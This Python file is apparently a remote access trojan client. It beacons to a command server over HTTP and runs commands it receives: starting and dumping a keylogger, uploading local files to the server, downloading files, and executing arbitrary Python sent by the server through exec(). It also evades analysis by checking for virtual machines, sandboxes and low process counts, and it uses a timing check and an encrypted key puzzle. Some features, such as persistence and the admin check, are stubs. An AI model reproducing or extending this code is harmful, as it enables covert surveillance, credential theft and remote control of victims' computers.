# Standard library imports
import ctypes
import json
import os
import shutil
import socket
import ssl
import subprocess
import sys
import threading
import time
from sys import platform
import requests
import random
import psutil
import platform
from uuid import getnode as get_mac
from cryptography.fernet import Fernet

# Related third party imports
import requests
from mss import mss

# Local application/library specific imports
import keylogger
# from mss import mss # mss v6.1.0
# import requests # v2.28.0

IP="127.0.0.1"
PORT=8080

class CMD:
    def __init__(self,c,p,f):
        self.c = c
        self.p = p
        self.f = f

commandsList = []
responseList = []
k = None

args = sys.argv

IPList = args[1]
PORT=int(args[2])
TESTMODE=args[3]

def download_url(url):
    get_response = requests.get(url)
    file_name = url.split('/')[-1]
    with open(file_name, 'wb') as out_file:
        out_file.write(get_response.content)


def screenshot():
    if platform == "win32" or platform == "darwin":
        with mss() as screen:
            filename = screen.shot()
            os.rename(filename, '.screen.png')
    elif platform == "linux" or platform == "linux2":
        with mss(display=":0.0") as screen:
            filename = screen.shot()
            os.rename(filename, '.screen.png')

# TODO: screenshot other monitors




# TODO rename from persist to `reg_persist`

def startup_persist(file_name):
    pass
    # TODO create persistence in startup folder


def is_admin():
    global admin
    if platform == 'win32':
        try:
            temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\windows'), 'temp']))
        except:
            admin = '[!!] User Privileges!'
        else:
            admin = '[+] Administrator Privileges!'
    elif platform == "linux" or platform == "linux2" or platform == "darwin":
        pass
        # TODO implmenet checking if these platforms have root/admin access


            
keylog = None
keythread = None
jitter = 1
isSleeping = False

def runCmd(cmdObj):
    global responseList
    global keylog
    global keythread
    global k
    global jitter
    params = cmdObj.p
    global isSleeping
    c = cmdObj.c
    loc = {}
    d = dict(locals(), **globals())
    ret = ''
    print(c)
 
    if c == 'keylog_start':
        try:
            keylog = keylogger.Keylogger()
            keythread = threading.Thread(target=keylog.start)
            keythread.start()
            ret = '[+] Keylogger Started!'
        except Exception as e:
            ret = 'Unable to start logger ' + str(e)
    elif c == 'keylog_dump':
        try:
            logs = keylog.read_logs()
            ret = logs
        except Exception as e:
            print(e)
            ret = 'Unable to dump logs'
    elif c == 'keylog_stop':
        try:
            keylog.self_destruct()
            keythread.join()
            ret = '[+] Keylogger Stopped!'
        except Exception as e:
            ret = 'Unable to stop keylogger' + str(e)
    elif c == 'download':
        try:
            req_header = {
                'api-key': k,
            }
            url = str(cmdObj.f)
            response = requests.get(url, headers=req_header)
            open(params, 'wb').write(response.content)
            ret = 'file downloaded!'
        except Exception as e:
            print(e)
            ret = 'Unable to download file'
    elif c == 'upload':
        try:
            req_header = {
                'api-key': k,
            }
            url = str(cmdObj.f)
            test_file = open(params, "rb")
            response = requests.post(url, files = {"file": test_file}, headers = req_header)
            ret = 'file uploaded!'
        except Exception as e:
            print(e)
            ret = 'Unable to upload file'
    elif c == 'jitter':
        jitter = params
        print(jitter)
        if not jitter:
            jitter = 1
        ret = 'Jitter timing set!'
    elif c == 'sleep':
        jitter = params
        print(jitter)
        if not jitter:
            jitter = 1
        isSleeping = True
        ret = 'Sleep for ' + str(jitter) + ' set!'
    else:
        print(cmdObj.f)
        exec(cmdObj.f,d,loc)
    
        if loc and loc['result']:
            ret = loc['result']
            print("-----ret-----")
            print(ret)
        else:
            ret = 'NO RESP FOR CMD'
    
    print("appending response")
    responseList.append(ret)
        
def Init():
    global c
    global url
    global state
    global macaddr
    global responseList
    global k
    global servkey
    partB = "i5kf_q47m9Ak_N88coVZt6E="
    PROTO = "http://"
    kurl = PROTO + IP + ":" + str(PORT) + "/k"
    k = None
    
    cpucount = psutil.cpu_count()
    if cpucount < 2 and TESTMODE == 'False':
         return -1
        
    mem = psutil.virtual_memory()
    if mem.total < 2062614528 and TESTMODE == 'False':
        return -1
        
    #vmserv = ['vbox', 'vmsrv', 'vmware', 'joebox', 'xenserv']
    vmserv = ['vmsrv', 'vmware', 'joebox', 'xenserv']
    c=0
    for process in psutil.process_iter ():
        c=c+1
        Name = process.name () # Name of the process
        ID = process.pid # ID of the process
        lowername = Name.lower()
        
        for white in vmserv:
            if white in lowername and TESTMODE == 'False':
                return -1

    if c < 100 and TESTMODE == 'False':
        return -1
    sleepTime = 1
    currentTime = time.time()
    curCount = 0
    if k is None:
        while True:
            time.sleep(sleepTime)
            temptime = time.time()
            diff = int(temptime - currentTime)
            print("DIFF: " + str(diff))
            if diff != sleepTime:
                return -1
            try:
                host = socket.gethostname()
                kbody = {
                    "host": host,
                    "mac": macaddr,
                    "platform": platform.system(),
                    "release": platform.release()
                }
                kresponse = requests.post(kurl, json=kbody);
                kres_json = kresponse.json()
                k = kres_json['key']
                partA = kres_json['partA']
                puz = kres_json['in']
                exp = kres_json['exp']
                full = partA + partB
                fullBytes = str.encode(full)
                cipher_suite = Fernet(fullBytes)
                expbyte = str.encode(exp)
                testdec = cipher_suite.decrypt(expbyte)
                finalstr = testdec.decode("utf-8")
                print("solving...")
                if puz != finalstr:
                    print("failed puzzle")
                    print("bye")
                    return -1
                else:
                    return 0 
            except requests.exceptions.RequestException as e:
                print(e)
                print("unable to init, bye")
                if curCount < 6:
                    sleepTime = sleepTime * 5
                    curCount = curCount + 1
                    currentTime = time.time()
                else:
                    return -1
            except Exception as e:
                print(e)
                print("bye")
                return -1
    return 0
    
def httpConnection():
    global c
    global url
    global state
    global macaddr
    global responseList
    macaddr = get_mac()
    state = "norm"
    partB = "i5kf_q47m9Ak_N88coVZt6E="
    PROTO = "http://"
    url = PROTO + IP + ":" + str(PORT) + "/cmd"
    kurl = PROTO + IP + ":" + str(PORT) + "/k"
    global servkey
    servkey = "QS#$%ED12"
    global k
    k = None
    retryCount = 0
    global encKEy
    initRes = Init()
    global isSleeping
    isSleeping = False
    global jitter
    jitter = 1
    if initRes < 0:
        print("unable to init, bye")
        return
        
    while True:
        sleepRange = int(jitter)
        if not isSleeping:
            sleepRange = random.randint(1, int(jitter))

        time.sleep(sleepRange)
        
        if isSleeping:
            isSleeping = False
            jitter = 1
            
        try:
            
            reqbody = {
                "mac": macaddr
            }
            if len(commandsList) > 0:
                topcmd = commandsList.pop(0)
                runCmd(topcmd)
                
            if len(responseList) > 0:
                reqbody['prevRes'] = responseList[0]
                responseList.pop(0)
            else:
                reqbody['prevRes'] = ''
            
            response = requests.post(url, json=reqbody);
            res_json = response.json()
            c = None
            p = None
            f = None
            if 'c' in res_json:
                c = res_json['c']
            if 'p' in res_json:
                p = res_json['p']
            if 'f' in res_json:
                f = res_json['f']
            if not c and not f:
                #print("no cmds")
                continue
            print("command recv!")
            print(c)
            newCmd = CMD(c,p,f)
            commandsList.append(newCmd)
        except Exception as e:
            print(e)
            print("error calling api")
            retryCount = retryCount + 1
            reInit = Init()
            if reInit < 0:
                print("terminating")
                return
        
           

print("starting...")
httpConnection()
#connection()


